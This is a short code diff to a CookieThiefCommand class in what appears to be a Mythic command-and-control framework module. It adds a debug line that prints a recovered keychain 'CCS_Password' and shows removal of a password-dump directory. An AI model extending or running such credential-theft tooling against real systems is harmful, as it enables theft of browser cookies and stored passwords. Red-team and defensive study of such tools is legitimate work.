@@ -119,6 +119,9 @@ class CookieThiefCommand(CommandBase):
 
         ccs_keyfile.close()
 
+        ##DEBUG:
+        print("CCS_Password: " + ccs_password)
+
         ## Remove the keychain password dump directory
         try:
             shutil.rmtree("/Mythic/mythic/passwords")
